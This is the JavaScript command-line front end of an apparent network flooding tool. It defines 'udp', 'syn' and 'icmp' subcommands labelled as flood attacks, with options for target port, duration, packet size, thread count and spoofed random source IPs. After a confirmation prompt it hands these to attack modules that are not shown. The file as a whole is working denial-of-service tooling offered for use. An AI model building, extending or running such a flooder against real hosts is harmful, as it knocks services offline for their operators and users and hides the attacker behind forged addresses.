'use strict';

const { program } = require('commander');

const pkg = require('../package.json');
const cst = require('./constants.js');
const confirm = require('./tools/confirm.js');
const hostToIp = require('./tools/hostToIp.js');

// protocols
const udp = require('./protocols/udp.js');
const syn = require('./protocols/syn.js');
const icmp = require('./protocols/icmp.js');




program.version(`v${pkg.version}`, '-v, --version')
    .helpOption('-h, --help')
    .usage('<commands> [options] target_host')
    .addHelpText('before', cst.LOGO)
    .showHelpAfterError('(add --help for additional information)');


program.command('udp')
    .summary(`UDP flood attack.`)
    .usage('[options] target_host')
    .addHelpText('after', cst.UDP_USAGE)
    .showHelpAfterError(cst.UDP_ERROR_HELP)
    .helpOption('-h, --help', 'output usage information')

    .option('-p, --port <number>', 'Port number', 80)                           // default 80 port
    .option('-t, --timeout <number>', 'Usage time(s)', 30)                      // default 30s
    .option('-d, --delay <number>', 'Every send delay(ms)', 100)                // default 100ms
    .option('-s, --size <number>', 'Set packet size(bytes) to sent', 20)        // default 20 Bytes, maximum 1472 Bytes
    .option('-T, --threads <number>', 'Number of Threads', 2)                   // default 2 Threads
    .option('-F, --fakeip', 'Generate random ip', false)                        // default disable

    .action(async (options, command) => {
        if (!command.args[0]) {
            console.log(cst.UDP_HELP); // -------- udp help
            process.exit(cst.ERROR_EXIT);
        }

        const host = await hostToIp(command.args[0]).catch(() => { console.log('Host not found.'); process.exit(cst.ERROR_EXIT); });
        if (!host) {
            console.log('Host error, only IPv4 protocol is supported.');
            process.exit(cst.ERROR_EXIT);
        }

        if (Number(options.size) >= 1472) {
            console.log('Maximum UDP packet payload exceeded.\n--size needs to be below 1472 bytes.');
            console.log(cst.UDP_ERROR_HELP);
            process.exit(cst.ERROR_EXIT);
        }


        console.log(cst.LOGO);
        console.log('host:    ' + command.args[0]);
        console.log('port:    ' + options.port);
        console.log('timeout: ' + options.timeout + ' s');
        console.log('delay:   ' + options.delay + ' ms');
        console.log('size:    ' + options.size + ' bytes');
        console.log('threads: ' + options.threads);
        console.log('fakeip:  ' + (options.fakeip ? 'Enable' : 'Disable'));
        console.log('');
        console.log(cst.DISCLAIMER);


        confirm().then(() => {
            udp(host,
                Number(options.port),
                Number(options.timeout),
                Number(options.delay),
                Number(options.size),
                Number(options.threads),
                options.fakeip ? 1 : 0);
        })
            .catch((error) => {
                console.log(error);
                process.exit(cst.ERROR_EXIT);
            });
    });


program.command('syn')
    .summary(`SYN flood attack.`)
    .usage('[options] target_host')
    .addHelpText('after', cst.SYN_USAGE)
    .showHelpAfterError(cst.SYN_ERROR_HELP)
    .helpOption('-h, --help', 'output usage information')

    .option('-p, --port <number>', 'Port number', 80)                           // default 80 port
    .option('-t, --timeout <number>', 'Usage time(s)', 30)                      // default 30s
    .option('-d, --delay <number>', 'Every send delay(ms)', 100)                // default 100ms
    .option('-T, --threads <string>', 'Number of Threads', 2)                   // default 2 Threads
    .option('-F, --fakeip', 'Generate random ip', false)                        // default disable

    .action(async (options, command) => {
        if (!command.args[0]) {
            console.log(cst.SYN_HELP) // -------- syn help
            process.exit(cst.ERROR_EXIT);
        }

        const host = await hostToIp(command.args[0]).catch(() => { console.log('Host not found.'); process.exit(cst.ERROR_EXIT); });
        if (!host) {
            console.log('Host error, only IPv4 protocol is supported.');
            process.exit(cst.ERROR_EXIT);
        }


        console.log(cst.LOGO);
        console.log('host:    ' + command.args[0]);
        console.log('port:    ' + options.port);
        console.log('timeout: ' + options.timeout + ' s');
        console.log('delay:   ' + options.delay + ' ms');
        console.log('threads: ' + options.threads);
        console.log('fakeip:  ' + (options.fakeip ? 'Enable' : 'Disable'));
        console.log('');
        console.log(cst.DISCLAIMER);


        confirm().then(() => {
            syn(host,
                Number(options.port),
                Number(options.timeout),
                Number(options.delay),
                Number(options.threads),
                options.fakeip ? 1 : 0);
        })
            .catch((error) => {
                console.log(error);
                process.exit(cst.ERROR_EXIT);
            });
    });


program.command('icmp')
    .summary(`ICMP flood attack.`)
    .usage('[options] target_host')
    .addHelpText('after', cst.ICMP_USAGE)
    .showHelpAfterError(cst.ICMP_ERROR_HELP)
    .helpOption('-h, --help', 'output usage information')

    .option('-t, --timeout <string>', 'Usage time(s)', '30')                        // default 30s
    .option('-T, --threads <string>', 'Number of Threads', '10')                    // default 10 Threads
    .option('-s, --size <string>', 'Set packet size(bytes) to sent', '56')          // default 56 Bytes, maximum 1472 Bytes

    .action(async (options, command) => {
        if (!command.args[0]) {
            console.log(cst.ICMP_HELP); // -------- udp help
            process.exit(cst.ERROR_EXIT);
        }

        const host = await hostToIp(command.args[0]).catch(() => { console.log('Host not found.'); process.exit(cst.ERROR_EXIT); });
        if (!host) {
            console.log('Host error, only IPv4 protocol is supported.');
            process.exit(cst.ERROR_EXIT);
        }


        console.log(cst.LOGO);
        console.log('host: ', command.args[0]);
        console.log('timeout: ', options.timeout + ' s');
        console.log('threads: ', options.threads);
        console.log('size: ', options.size + ' bytes');
        console.log('');
        console.log(cst.DISCLAIMER);


        confirm().then(() => {
            icmp(host, options.timeout, options.threads, options.size);
        })
            .catch((error) => {
                console.log(error);
                process.exit(cst.ERROR_EXIT);
            });
    });


program.parse(process.argv);